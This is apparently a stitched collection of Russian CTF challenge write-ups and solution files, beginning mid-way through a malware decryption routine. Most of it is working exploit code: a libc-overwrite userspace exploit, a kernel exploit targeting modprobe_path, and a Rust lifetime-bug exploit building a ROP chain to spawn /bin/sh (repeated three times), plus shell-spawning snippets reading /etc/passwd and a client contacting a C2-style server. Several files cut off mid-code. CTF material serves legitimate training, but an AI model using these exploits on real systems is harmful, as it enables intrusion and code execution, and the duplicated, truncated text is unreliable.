        derivedKey[i] = first_16_bytes_of_png[i] ^ xorConstant[i];
    }

    // Initialize Crypto API
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL result = FALSE;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }

    // Create hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // Hash the derived key
    if (!CryptHashData(hHash, derivedKey, 16, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        //std::cout << "137" << std::endl;
        return FALSE;
    }

    // Derive AES key from hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        //std::cout << "145" << std::endl;
        return FALSE;
    }

    if ((fileSize % 16) != 0) {
        fileSize += 16 - (fileSize % 16);
    }

    DWORD dataSize = fileSize;
    BYTE* dataToEncrypt = new BYTE[dataSize];
    memset(dataToEncrypt, 0x0, dataSize);
    memcpy(dataToEncrypt, fileData.data(), fileData.size());

    if (!CryptDecrypt(hKey, 0, 0, 0, dataToEncrypt, &dataSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // Write encrypted data back to file
    std::ofstream outFile(filePath + "_decrypted.png", std::ios::binary);
    if (outFile.is_open()) {
        outFile.write(reinterpret_cast<char*>(dataToEncrypt), dataSize);
        outFile.close();
        result = TRUE;
    }

    // Cleanup
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    //std::cout << "TRUE!" << std::
```

##########################################################################################
# forensic/Funeral
## README
# Funeral | Forensics

## Информация

> После того как я поставил эту новую прошивку мой роутер можно хоронить.
>
> Он перестал нормально работать и теперь всё долго грузится
> 
> Решил посмотреть на трафик и записал дамп, может он поможет разобраться в чём дело?
>
> Я отправлял через роутер картинку с флагом, но до того как начал записывать трафик.
>
> *Обратите внимание, что у вас именно файл обновления прошивки. У вас нет кода обновления, а это значит что вы не можете гарантировать наличие всех файлов внури ФС файла обновления, код обновления может добавлять какие-то куски файла обновления на ФС, внимательно смотрите на все участки файла обновления*

## Деплой

Не требуется

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Форензика на прошивку. Прошивка содержит ядро, рутфс и некоторый хвост на 48 байт (ключ и IV для AES).

## Решение

[Подробрное решение](solve/README.md)

## Флаг

`ctfcup{sp4c3_funer4l_1s_4_g00d_g4m3}`

## SOLUTION FILES
- solve\README.md
- solve\decrypt.py
- solve\assets\bin_time.png
- solve\assets\binwalk_start.png
- solve\assets\binwalk_unpack.png
- solve\assets\crontab.png
- solve\assets\egrep_reverse.png
- solve\assets\unpack_fs.png
### solve\README.md
```md
# Анализ файла обновления

Нам дан файл обновления прошивки. Мы можем изучить его заголовок и понять, что он кастомный.
Но можно и не делать этого, а просто запустить утилиту `binwalk` и увидеть три пожатых сегмента.

![](./assets/binwalk_start.png)

С помощью этой же утилиты можно распаковать эти участки.

![](./assets/binwalk_unpack.png)

Видим ядро и ФС, а также какой-то бинарный файл.

## Анализ ФС

Распаковываем файловую систему и изучаем её.

![](./assets/unpack_fs.png)

Изучаем различные места закрепления и находим команду в `crontab`

![](./assets/crontab.png)

Смотрим на скрипт

![](./assets/bin_time.png)

Видим очень подозрительные команды. Из скрипта видно, что записывается дамп трафика на интерефейсе и каждый час мы запускаем утилиту `egrep`

Это довольно подозрительно, поэтому надо изучить что собой представляет `egrep`

## Анализ исполняемого файла /bin/egrep

Загружаем файл в IDA и видим, что ничего ревёрсить не надо так как все имена функций у нас есть.

![](./assets/egrep_reverse.png)

Смотрим что делает код и понимаем, что он просто использует Linux Crypto API и шифрует файл с помощью AES-ECB на ключе который берётся из некоторого файла `/etc/update_fw_tail`
Здесь может быть не самый очевидный момент, т.к. этого файла нет в ФС. Но у нас просто статичная ФС, а прошивка может обновлять какие то файлы при установке.

Нам нужно вспомнить, что в конце нашего файла обновления находился некоторый странный файл. Нам нужно использовать его для получения ключа для шифрования.

Достаём ключ и расшифровываем трафик который шёл по UDP на порт 1337 на сервер `133.7.133.7`

Расшифровываем трафик и получаем ещё одни дамп в котором отправляется картинка в открытом виде.

Достаём картинку и на ней написан флаг.

Скрипт для расшифровки - [скрипт](./decrypt.py)

```
### solve\decrypt.py
```py
#!/usr/bin/env python3
from Crypto.Cipher import AES
from binascii import unhexlify
import sys

k = unhexlify("0102030405060708090A0B0C0D0E0F10000102030405060708090A0B0C0D0E0F")
ctx = AES.new(k, AES.MODE_ECB)
data = open(sys.argv[1], 'rb').read()

dec = ctx.decrypt(data)

fd = open("decrypted.pcap", 'wb')
fd.write(dec)
fd.close()
```

##########################################################################################
# forensic/brokilon
## README
# Brokilon | Forensics + Reverse

## Информация

> В этом лесу очень легко заблудиться и пойти не туда.
>
> 
>
> Формат флага: `ctfcup{}`


## Деплой

`docker compose up --build -d`

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Форензика на реестр с fileless малварью

## Решение

[Подробрное решение](solve/README.md)

## Флаг

`ctfcup{s00me_v3rY_s3cr3t_m3ss4g3_f0r_r34l_0x1337_hackers!}`

## SOLUTION FILES
- solve\README.md
- solve\client.py
- solve\decrypted_file.png
- solve\decypt_file.py
- solve\encrypted_file_from_server.bin
- solve\net_client.bin
- solve\stage1.bin
- solve\stage2.bin
- solve\assets\autorun_psh.png
- solve\assets\check_explorer_func.png
- solve\assets\config_decrypt_code.png
- solve\assets\decrypt_conf_results.png
- solve\assets\encrypt_block.png
- solve\assets\file_encryption_func.png
- solve\assets\func_by_hash_raw.png
- solve\assets\gen_hash.png
- solve\assets\get_sid_function.png
- solve\assets\loader_stage1.png
- solve\assets\main_decrypt_config.png
- solve\assets\md5_check.png
- solve\assets\net_client_raw.png
- solve\assets\network_code_patcher.png
- solve\assets\stage1_injector.png
- solve\assets\stage2_blob.png
- solve\assets\stage2_main.png
- solve\assets\winbindex_explorer_hash.png
### solve\client.py
```py
#!/usr/bin/env python3
import socket
import base64
from arc4 import ARC4
import json

class RC4:
    """RC4 cipher implementation"""

    def __init__(self, key):
        self.key = key.encode() if isinstance(key, str) else key
        self.sbox = self._init_sbox()

    def _init_sbox(self):
        """Initialize S-box"""
        sbox = list(range(256))
        j = 0
        for i in range(256):
            j = (j + sbox[i] + self.key[i % len(self.key)]) % 256
            sbox[i], sbox[j] = sbox[j], sbox[i]
        return sbox

    def encrypt(self, data):
        """Encrypt data using RC4"""
        data_bytes = data.encode() if isinstance(data, str) else data
        sbox = self.sbox.copy()
        result = []
        i = j = 0

        for byte in data_bytes:
            i = (i + 1) % 256
            j = (j + sbox[i]) % 256
            sbox[i], sbox[j] = sbox[j], sbox[i]
            k = sbox[(sbox[i] + sbox[j]) % 256]
            result.append(byte ^ k)

        return bytes(result)

    def decrypt(self, data):
        """Decrypt data using RC4 (same as encrypt for RC4)"""
        return self.encrypt(data)


if __name__ == "__main__":
    _hash = 'd91bf246270157aa9f369093a5e3f29b'
    _filename = '60843cbbdcec4da25bfa97e00b164991'

    packet = {'cmd':'auth', 'hash':_hash}
    packet = json.dumps(packet)

    ctx = RC4('std::vector_key')
    enc_packet = ctx.encrypt(packet)
    enc_packet = base64.b64encode(enc_packet)

    s = socket.socket()

    s.connect(('94.139.253.45', 4444))

    s.send(enc_packet + b'\n')

    data = s.recv(4096)
    print(ctx.decrypt(base64.b64decode(data)))

    packet = {'cmd':'download', 'filename':_filename}
    packet = json.dumps(packet)
    enc_packet = ctx.encrypt(packet)
    enc_packet = base64.b64encode(enc_packet)

    s.send(enc_packet + b'\n')
    s.settimeout(0.5)

    data = b''
    while True:
        try:
            tmp = s.recv(1024 * 1024)
            if tmp != b'':
                data += tmp
            else:
                break
        except:
            break
    
    data = ctx.decrypt(base64.b64decode(data))
    data = base64.b64decode(json.loads(data)['data'])

    fd = open('encrypted_file_from_server.bin', 'wb')
    fd.write(data)
    fd.close()

    s.close()
```
### solve\decypt_file.py
```py
#!/usr/bin/env python3
import ctypes

def decrypt(key, input_data):
    if len(key) != 16:
        raise ValueError("Key must be exactly 16 bytes")
    
    data_len = len(input_data)
    output = (ctypes.c_ubyte * data_len)()
    
    for pos in range(data_len):
        byte = ctypes.c_uint32(input_data[pos])
        
        # Step 1: XOR with multiplication result (32-bit wrap)
        temp = (pos * 0x5A827999) & 0xFFFFFFFF
        byte.value ^= (temp >> 8) & 0xFF
        
        # Step 2: XOR with key byte and position
        byte.value ^= key[(pos + 7) % 16] ^ (pos & 0xFF)
        
        # Step 3: XOR with constant and rotate bits
        byte.value ^= 0xAA
        byte.value = ((byte.value >> 3) | (byte.value << 5)) & 0xFF
        
        # Step 4: Bit rotation based on key and position
        rot_amount = (pos + key[pos % 16]) & 7
        byte.value = ((byte.value >> rot_amount) | (byte.value << (8 - rot_amount))) & 0xFF
        
        # Step 5: Final XOR with key
        byte.value ^= key[pos % 16]
        
        output[pos] = byte.value
    
    return bytes(output)

data = open('encrypted_file_from_server.bin', 'rb').read()
key = [0xae, 0x55, 0xb8, 0x99, 0x4d, 0x13, 0x0, 0x44, 0x8d, 0xb, 0x18, 0xb7, 0x1, 0x12, 0x8f, 0xb]

out = decrypt(key, data)

fd = open("decrypted_file.png", 'wb')
fd.write(out)
fd.close()
```

##########################################################################################
# pwn/bad_parser
## README
# bad parser | pwn

## Информация

> Я вообще не понимаю что тут написано!
> 
> `nc <ip> 17003`
> 

## Деплой

```sh
cd deploy
docker compose up --build -d
```

## Выдать участинкам

Provide zip archive: [public/bad_parser_public.zip](public/bad_parser_public.zip).

## Описание

Linux userspace pwn
TOCTOU -> mmap OOB -> libc leak -> overwirte TLS/printf/etc to make code exec

## Решение

[Exploit](solve/remote_exploit.py)

## Флаг

ctfcup{r34lllly_b4d_f0000rrrmm4t_f1l3}
## SOLUTION FILES
- solve\remote_exploit.py
### solve\remote_exploit.py
```py
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
mmap_libc_diff = 278528
secret = 0

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def ptr_mangle(ptr: int) -> int:
    global secret
    val = ptr ^ secret
    val = rol(val, 0x11, 64)
    return val


def make_dumb_entry() -> bytes:
    v1 = p32(0x8, endian='big')
    v2 = p32(0x0, endian='big')
    return v1 + v2

def make_conditional_64bit_entry() -> bytes:
    v1 = p32(0x0, endian='big')
    v2 = p32(0x0, endian='big')
    return v1 + v2

def gen_dumb_file_data() -> bytes:
    data = make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 4
    data += make_conditional_64bit_entry()
    data += make_dumb_entry()
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 2
    data += make_conditional_64bit_entry()
    data += make_dumb_entry() * 3
    data += make_conditional_64bit_entry()
    return data

def create_exploit_binary_file(libc_bss) -> bytes:
    data = gen_dumb_file_data()

    _chain = [
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
        p32(libc_bss & 0xffffffff, endian='big'),
        p32((libc_bss >> 32) & 0xffffffff, endian='big'),
    ]
    chain_len = len(b''.join(_chain))

    data += p64(0x0) # skip 8 bytes code
    data += p32(6, endian='big') # sample count
    data += b''.join(_chain) # sample 1

    #mmap_libc_diff = 278528
    data += b'b' * (mmap_libc_diff - len(data) - 10432) # )
    data += b'b' * 164
    data += b'a' * (328-chain_len)
    print("create_exploit_binary_file: " + hex(len(data)))
    return data

def create_setuper_binary_file(system, bin_sh) -> bytes:
    data = gen_dumb_file_data()

    system = ptr_mangle(system)
    _chain = [
        p32(system & 0xffffffff, endian='big'),
        p32((system >> 32) & 0xffffffff, endian='big'),
        p32(bin_sh & 0xffffffff, endian='big'),
        p32((bin_sh >> 32) & 0xffffffff, endian='big'),
        p32(bin_sh & 0xffffffff, endian='big'),
        p32((bin_sh >> 32) & 0xffffffff, endian='big'),
    ]

    chain_len = len(b''.join(_chain))

    data += p64(0x0) # skip 8 bytes code
    data += p32(0x6, endian='big') # sample count
    data += b''.join(_chain) # sample 1

    #mmap_libc_diff = 278528
    libc_rw_offset = 0x204c00 + 168#
    data += b'a' * (mmap_libc_diff - len(data))
    data += b'b' * 164
    data += b'c' * libc_rw_offset
    return da
```

##########################################################################################
# pwn/play_with_ker
## README
# Play with Ker | pwn

## Информация

> Никто не хочет играть со мной в WoW. Все говорят, что это для стариков и скучно.
> 
> Что ж, может быть тогда вы будете не против сыграть со мной в более простую игру?
> 
> `nc <ip> 17002`
> 

## Деплой

```sh
cd deploy
docker compose up --build -d
```

## Выдать участинкам

Provide zip archive: [public/play_with_ker_public.zip](public/play_with_ker_public.zip).

## Описание

Linux kernel pwn
OOB in heap -> file spray -> leak KASLR via `cpu_entry_area` -> AW `modrpobe_path`

## Решение

[Exploit](solve/exploit.c)

## Флаг

ctfcup{th4nk5_f0r_th3_pl4y1ng_I_h0000p33_y00u_enj0y_1t!}

## SOLUTION FILES
- solve\exploit.c
### solve\exploit.c
```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <fcntl.h>
#include <sys/mman.h>

#define A_NEW_GAME 0x0101
#define A_MAKE_GUESS 0x0102
#define A_GET_RESULT 0x0103
#define A_DELETE_GAME 0x0104
#define A_CHANGE_PLAYER_NAME 0x0105
#define SPRAY_FILE_SIZE 1024 * 128

struct new_game_request {
    char player_name[64];
};

struct make_guess_request {
    uint64_t index;
    uint32_t guess;
};

struct get_result_request {
    uint64_t index;
    uint8_t result[16];
};

struct delete_game_request {
    uint64_t index;
};

struct change_player_name_request {
    uint64_t index;
    char new_player_name[64];
};

struct fake_game_kernel_struct {
    uint64_t id;                    // Internal game ID
    char *ptr_AW;              // Player name
    char *ptr_AR;                   // Game result ("GOOOOOL" or "NE GOL")
    uint32_t pad;         // Secret number
    uint32_t pad1;             // Game activity flag
};

int main() {
    int fd;
    int ret;
    uint64_t game_index = 0;
    uint32_t guess;
    
    fd = open("/dev/game", O_RDWR);
    if (fd < 0) {
        perror("Failed to open /dev/game");
        return 1;
    }
    
    // spray with evil structs in file
    // because we use initramfs and it stored in RAM memory
    
    struct fake_game_kernel_struct fake_game;
    fake_game.id = 0;
    fake_game.ptr_AW = (char*)(0xfffffe0000000004);
    fake_game.ptr_AR = (char*)(0xfffffe0000000004);
    fake_game.pad = 0;
    fake_game.pad1 = 0;

    for (int i = 0; i < 512; i++) {
        char filename[256];
        sprintf(filename, "/tmp/evil_struct_%d", i);
        int tmp_fd = open(filename, O_CREAT | O_RDWR);
        
        if (tmp_fd < 0) {
            printf("Failed to open /tmp/evil_struct_%d\n", i);
            return 1;
        }

        char* buf = (char*) malloc(SPRAY_FILE_SIZE);
        for (int j = 0; j < SPRAY_FILE_SIZE / sizeof(fake_game); j++) {
            memcpy(&buf[j * sizeof(fake_game)], &fake_game, sizeof(fake_game));
        }

        write(tmp_fd, buf, SPRAY_FILE_SIZE);
        free(buf);
        close(tmp_fd);
        
        chmod(filename, 0644);
    }

    // create new game
    struct new_game_request new_game_req;
    strcpy(new_game_req.player_name, "test_game");
    ret = ioctl(fd, A_NEW_GAME, &new_game_req);
    if (ret < 0) {
        perror("Failed to create new game");
        return 1;
    }
    printf("New game created with index: %llu\n", ret);
    
    struct get_result_request result_req;
    memset(result_req.result, 0, 16);
    result_req.index = 740046;
    ret = ioctl(fd, A_GET_RESULT, &result_req);
    if (ret < 0) {
        perror("Failed to get result");
        return 1;
    }

    uint64_t KASLR_leak = *(uint64_t*)(result_req.result);
    uint64_t KASLR_base = KASLR_leak - 0x1008e00;
    uint64_t modprobe_path
```

##########################################################################################
# pwn/safelang
## README
# safelang | pwn

## Информация

В мрачной мгле недалекого будущего есть только memory-safety.

## Деплой

```sh
cd deploy
docker compose -p safelang up --build -d
```

## Выдать участинкам

Provide zip archive: [public/safelang.zip](public/safelang.zip).

## Описание

lifetime extension hack с помощью техники из cve-rs.

## Решение

[Подробрное решение](solve/Readme.md)

## Обход 1

```rust
use std::process::{Command, CommandArgs};
fn main() {
    let mut process = Command::new("sh").arg("-c").arg("cat /flag*").spawn().unwrap().wait_with_output();
    print!("{:?}", process);
}
```

## Обход 3


```rust
extern crate std as asdf;

fn main() {
    let x = asdf::process::Command::new("/bin/sh").arg("-c").arg("cat /etc/passwd").output().unwrap().stdout;
    let x = String::from_utf8_lossy(&x);

    print(x);
}
```

## SOLUTION FILES
- solve\Readme.md
- solve\gadgets.txt
- solve\libc.so.6
- solve\solve.rs
### solve\Readme.md
```md
# Дано

Нам дан [скрипт](../deploy/main.py) на питоне, подвешенный на сокате, который принимает файл в `base64` кодировке, пишет его в `kek.rs` и запускает команду `cargo run`. Эта комманда запускает проэкт на расте, состоящий из 2 частей: `proc_macro` которое проверяет что файл в `kek.rs` не использует никаких вызовов кроме тех, что содержатся в rust `prelude`, и не исполняет макросов кроме `print`, `println` и `vec`, и вставляет этот файл; и главного файл, который лишь применяет этот макрос. От нас требуется прочитать файл со случайным названием.

# Отсупление про макросы в расте

Макросы в расте, а конкретно `proc_macro`, это такие функции которые исполняются при компиляции. Они принимают на вход и возращают поток токенов (репрезентацию даннных компилятора). По сути они позволяют модифицировать код, превращая его в произвольный компилируемый код (к которому применяются все те же ограничения вроде lifetime и unsafe). В нашем случае происходить проверка на вызов только разрешенных макросов, функций и полный запрет unsafe, затем возращается тот же код. (гонка не возможна, потому что мы вставляет уже проверенный код, не читая из файла дважды).

# Как будем действовать

В языке rust накладываются строгие ограничения на код, которые не позволяют нам просто так написать на стек роп. В частности существует так называемый `borrow checker`, который проверяет что время жизни (далее lifetime) обьекта не превышает время жизни обьектов от которых он зависим, в частности время жизни ссылки на обьект не превышает время жизни самого обьекта. Именно это ограничение мы и будем обходить, чтобы получить исполнение произвольного кода с помощью [техники](https://github.com/Speykious/cve-rs/blob/main/src/lifetime_expansion.rs). Сама техника основано на баге компилятора, про нее можно прочитать в комментариях в соотвествующем файле. По сути она позволяет продлить lifetime любого обьекта до `'static` (статического "бесконечного" лайфайтам). Существует много разных способо использования этой техники для получения rce, мы раскажем лишь про один (возможно самый простой) из них.

# Heap leak, arbitrary read/write

Идея в том что мы получим один вектор у которого данные освобождены и указывают на другой вектор лежащий на хипе. Таким образом мы сможем прочитать (получая лик хипы) или записать указатель второго вектора (получая arbitrary read/write). Требуется получить вектор с `capacity == size` размера структуры вектора `std::mem::size_of::<Vec<u8>>() == 24`. Проще всего этого достигнуть использую вектор с элементом размера `3` (`Vec<[u8; 3]>`). Поскольку вектор [амортизированно](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#571) растет [2 раза](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#659), начиная с `1`, добавив 8 раз элемент в такой вектор получим вектор с размером буфера 24 байта. Затем аллоцируем вектор на хипе: сделаем вектор векторов из одного элемента (`vec![vec![1337u64]]`).
```rust
let v = {
    // создаем вектор со статическим lifetime с 
```
### solve\solve.rs
```rs
#[inline(never)]
pub const fn lifetime_translator<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b T) -> &'a T {
    val_b
}

#[inline(never)]
pub fn lifetime_translator_mut<'a, 'b, T: ?Sized>(
    _val_a: &'a &'b (),
    val_b: &'b mut T,
) -> &'a mut T {
    val_b
}

pub fn expand<'a, 'b, T: ?Sized>(x: &'a T) -> &'b T {
    let f: for<'x> fn(_, &'x T) -> &'b T = lifetime_translator;
    f(STATIC_UNIT, x)
}

pub fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut;
    f(STATIC_UNIT, x)
}

pub const STATIC_UNIT: &&() = &&();

fn main() {
    let v = {
        // создаем вектор со статическим lifetime с размером буфера 24 байт
        let mut a = vec![];
        for _ in 0..8 {
            a.push([0u8; 3]);
        }
        let r = &mut a;
        expand_mut(r)
    };

    // вектор векторов на хипе
    let mut vv = vec![vec![1337u64]];

    fn read_address(v: &[[u8; 3]]) -> u64 {
        // чтение 8 байт с оффсета 8 и превращение их в число
        let mut buf = [0u8; 8];
        for i in 0..8 {
            buf[i] = v[(i + 8) / 3][(i + 8) % 3];
        }
        u64::from_le_bytes(buf)
    }

    fn write_address(v: &mut [[u8; 3]], addr: u64) {
        // запись 8-байтового числа по оффсету 8
        let buf = addr.to_le_bytes();
        for i in 0..8 {
            v[(i + 8) / 3][(i + 8) % 3] = buf[i];
        }
    }

    let heap_leak = read_address(v);

    let mut arbitrary_read = |addr| -> u64 {
        write_address(v, addr);
        vv[0][0]
    };

    println!("HEAP LEAK 0x{:x}", heap_leak);

    let mut libc_leak_address = heap_leak;
    while arbitrary_read(libc_leak_address) & 0xfff != 0x4e0 {
        libc_leak_address -= 8;
    }

    let libc_leak = arbitrary_read(libc_leak_address);
    let libc_base = libc_leak - 0x1e84e0;
    println!("LIBC BASE 0x{:x}", libc_base);
    let environ = arbitrary_read(libc_base + 0x1EEE28);
    println!("ENVIRON 0x{:x}", environ);
    let stack = environ - 0x300;

    let mut arbitrary_write = |addr, value| {
        write_address(v, addr);
        vv[0][0] = value;
    };

    let system = libc_base + 0x53110;
    let bin_sh = libc_base + 0x1A7EA4;
    let pop_rdi = libc_base + 0x2a145;
    let ret = libc_base + 0x2a145 + 1;
    arbitrary_write(stack, pop_rdi);
    arbitrary_write(stack + 8, bin_sh);
    arbitrary_write(stack + 16, ret);
    arbitrary_write(stack + 24, system);

    write_address(v, heap_leak);
}

```

##########################################################################################
# pwn/safelang-revenge
## README
# safelang | pwn

## Информация

В мрачной мгле недалекого будущего есть только memory-safety.

## Деплой

```sh
cd deploy
docker compose -p safelang up --build -d
```

## Выдать участинкам

Provide zip archive: [public/safelang.zip](public/safelang.zip).

## Описание

lifetime extension hack с помощью техники из cve-rs.

## Решение

[Подробрное решение](solve/Readme.md)

## Обход 1

```rust
use std::process::{Command, CommandArgs};
fn main() {
    let mut process = Command::new("sh").arg("-c").arg("cat /flag*").spawn().unwrap().wait_with_output();
    print!("{:?}", process);
}
```

## Обход 3


```rust
extern crate std as asdf;

fn main() {
    let x = asdf::process::Command::new("/bin/sh").arg("-c").arg("cat /etc/passwd").output().unwrap().stdout;
    let x = String::from_utf8_lossy(&x);

    print(x);
}
```

## SOLUTION FILES
- solve\Readme.md
- solve\gadgets.txt
- solve\libc.so.6
- solve\solve.rs
### solve\Readme.md
```md
# Дано

Нам дан [скрипт](../deploy/main.py) на питоне, подвешенный на сокате, который принимает файл в `base64` кодировке, пишет его в `kek.rs` и запускает команду `cargo run`. Эта комманда запускает проэкт на расте, состоящий из 2 частей: `proc_macro` которое проверяет что файл в `kek.rs` не использует никаких вызовов кроме тех, что содержатся в rust `prelude`, и не исполняет макросов кроме `print`, `println` и `vec`, и вставляет этот файл; и главного файл, который лишь применяет этот макрос. От нас требуется прочитать файл со случайным названием.

# Отсупление про макросы в расте

Макросы в расте, а конкретно `proc_macro`, это такие функции которые исполняются при компиляции. Они принимают на вход и возращают поток токенов (репрезентацию даннных компилятора). По сути они позволяют модифицировать код, превращая его в произвольный компилируемый код (к которому применяются все те же ограничения вроде lifetime и unsafe). В нашем случае происходить проверка на вызов только разрешенных макросов, функций и полный запрет unsafe, затем возращается тот же код. (гонка не возможна, потому что мы вставляет уже проверенный код, не читая из файла дважды).

# Как будем действовать

В языке rust накладываются строгие ограничения на код, которые не позволяют нам просто так написать на стек роп. В частности существует так называемый `borrow checker`, который проверяет что время жизни (далее lifetime) обьекта не превышает время жизни обьектов от которых он зависим, в частности время жизни ссылки на обьект не превышает время жизни самого обьекта. Именно это ограничение мы и будем обходить, чтобы получить исполнение произвольного кода с помощью [техники](https://github.com/Speykious/cve-rs/blob/main/src/lifetime_expansion.rs). Сама техника основано на баге компилятора, про нее можно прочитать в комментариях в соотвествующем файле. По сути она позволяет продлить lifetime любого обьекта до `'static` (статического "бесконечного" лайфайтам). Существует много разных способо использования этой техники для получения rce, мы раскажем лишь про один (возможно самый простой) из них.

# Heap leak, arbitrary read/write

Идея в том что мы получим один вектор у которого данные освобождены и указывают на другой вектор лежащий на хипе. Таким образом мы сможем прочитать (получая лик хипы) или записать указатель второго вектора (получая arbitrary read/write). Требуется получить вектор с `capacity == size` размера структуры вектора `std::mem::size_of::<Vec<u8>>() == 24`. Проще всего этого достигнуть использую вектор с элементом размера `3` (`Vec<[u8; 3]>`). Поскольку вектор [амортизированно](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#571) растет [2 раза](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#659), начиная с `1`, добавив 8 раз элемент в такой вектор получим вектор с размером буфера 24 байта. Затем аллоцируем вектор на хипе: сделаем вектор векторов из одного элемента (`vec![vec![1337u64]]`).
```rust
let v = {
    // создаем вектор со статическим lifetime с 
```
### solve\solve.rs
```rs
#[inline(never)]
pub const fn lifetime_translator<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b T) -> &'a T {
    val_b
}

#[inline(never)]
pub fn lifetime_translator_mut<'a, 'b, T: ?Sized>(
    _val_a: &'a &'b (),
    val_b: &'b mut T,
) -> &'a mut T {
    val_b
}

pub fn expand<'a, 'b, T: ?Sized>(x: &'a T) -> &'b T {
    let f: for<'x> fn(_, &'x T) -> &'b T = lifetime_translator;
    f(STATIC_UNIT, x)
}

pub fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut;
    f(STATIC_UNIT, x)
}

pub const STATIC_UNIT: &&() = &&();

fn main() {
    let v = {
        // создаем вектор со статическим lifetime с размером буфера 24 байт
        let mut a = vec![];
        for _ in 0..8 {
            a.push([0u8; 3]);
        }
        let r = &mut a;
        expand_mut(r)
    };

    // вектор векторов на хипе
    let mut vv = vec![vec![1337u64]];

    fn read_address(v: &[[u8; 3]]) -> u64 {
        // чтение 8 байт с оффсета 8 и превращение их в число
        let mut buf = [0u8; 8];
        for i in 0..8 {
            buf[i] = v[(i + 8) / 3][(i + 8) % 3];
        }
        u64::from_le_bytes(buf)
    }

    fn write_address(v: &mut [[u8; 3]], addr: u64) {
        // запись 8-байтового числа по оффсету 8
        let buf = addr.to_le_bytes();
        for i in 0..8 {
            v[(i + 8) / 3][(i + 8) % 3] = buf[i];
        }
    }

    let heap_leak = read_address(v);

    let mut arbitrary_read = |addr| -> u64 {
        write_address(v, addr);
        vv[0][0]
    };

    println!("HEAP LEAK 0x{:x}", heap_leak);

    let mut libc_leak_address = heap_leak;
    while arbitrary_read(libc_leak_address) & 0xfff != 0x4e0 {
        libc_leak_address -= 8;
    }

    let libc_leak = arbitrary_read(libc_leak_address);
    let libc_base = libc_leak - 0x1e84e0;
    println!("LIBC BASE 0x{:x}", libc_base);
    let environ = arbitrary_read(libc_base + 0x1EEE28);
    println!("ENVIRON 0x{:x}", environ);
    let stack = environ - 0x300;

    let mut arbitrary_write = |addr, value| {
        write_address(v, addr);
        vv[0][0] = value;
    };

    let system = libc_base + 0x53110;
    let bin_sh = libc_base + 0x1A7EA4;
    let pop_rdi = libc_base + 0x2a145;
    let ret = libc_base + 0x2a145 + 1;
    arbitrary_write(stack, pop_rdi);
    arbitrary_write(stack + 8, bin_sh);
    arbitrary_write(stack + 16, ret);
    arbitrary_write(stack + 24, system);

    write_address(v, heap_leak);
}

```

##########################################################################################
# pwn/safelang-revenge-revenge
## README
# safelang | pwn

## Информация

В мрачной мгле недалекого будущего есть только memory-safety.

## Деплой

```sh
cd deploy
docker compose -p safelang up --build -d
```

## Выдать участинкам

Provide zip archive: [public/safelang.zip](public/safelang.zip).

## Описание

lifetime extension hack с помощью техники из cve-rs.

## Решение

[Подробрное решение](solve/Readme.md)

## Обход 1

```rust
use std::process::{Command, CommandArgs};
fn main() {
    let mut process = Command::new("sh").arg("-c").arg("cat /flag*").spawn().unwrap().wait_with_output();
    print!("{:?}", process);
}
```

## Обход 3


```rust
extern crate std as asdf;

fn main() {
    let x = asdf::process::Command::new("/bin/sh").arg("-c").arg("cat /etc/passwd").output().unwrap().stdout;
    let x = String::from_utf8_lossy(&x);

    print(x);
}
```

## SOLUTION FILES
- solve\Readme.md
- solve\gadgets.txt
- solve\libc.so.6
- solve\solve.rs
### solve\Readme.md
```md
# Дано

Нам дан [скрипт](../deploy/main.py) на питоне, подвешенный на сокате, который принимает файл в `base64` кодировке, пишет его в `kek.rs` и запускает команду `cargo run`. Эта комманда запускает проэкт на расте, состоящий из 2 частей: `proc_macro` которое проверяет что файл в `kek.rs` не использует никаких вызовов кроме тех, что содержатся в rust `prelude`, и не исполняет макросов кроме `print`, `println` и `vec`, и вставляет этот файл; и главного файл, который лишь применяет этот макрос. От нас требуется прочитать файл со случайным названием.

# Отсупление про макросы в расте

